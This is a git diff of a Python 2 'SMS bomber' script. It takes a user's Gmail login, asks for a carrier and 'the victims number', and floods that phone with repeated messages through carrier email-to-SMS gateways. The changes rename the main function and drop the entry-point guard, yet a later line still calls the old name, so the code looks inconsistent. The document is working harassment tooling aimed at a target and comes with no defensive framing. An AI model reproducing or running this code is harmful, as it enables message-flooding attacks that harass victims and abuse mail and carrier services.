@@ -19,13 +19,13 @@ packet = (
             0x02E806DC
         )
 
-def SMSBomb():
-    gmail_username = raw_input('\n\t[!] Enter Secure Gmail: ') 
+def bomb():
+    gmail_username = raw_input('\n\t[!] Enter Secure Gmail: ')
     gmail_password = getpass.getpass(prompt='\t[!] Enter Secure Pass: ')
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
     msg_from = '\x01'
-    msg_subject = '\x01' 
+    msg_subject = '\x01'
     print"""
 	[1] AT&T
 	[2] Boost Mobile
@@ -50,7 +50,7 @@ def SMSBomb():
         carrier = "@vmobl.com"
     elif sms_carrier == '7':
         carrier = "@vtext.com"
-    msg_to = raw_input('\t[!] What is the victims number: +')+str(carrier)  
+    msg_to = raw_input('\t[!] What is the victims number: +')+str(carrier)
     thread_count = raw_input('\t[!] How many threads: ')
     msg_text = packet*int(thread_count)
     thread_send = raw_input('\t[!] How many times would you like to send the thread: ')
@@ -68,6 +68,3 @@ def SMSBomb():
     	SMSBomb()
     elif reset_smsbomber_module == 'n' or reset_smsbomber_module == 'N':
     	sys.exit()
-
-if __name__ == '__main__':
-	SMSBomb()
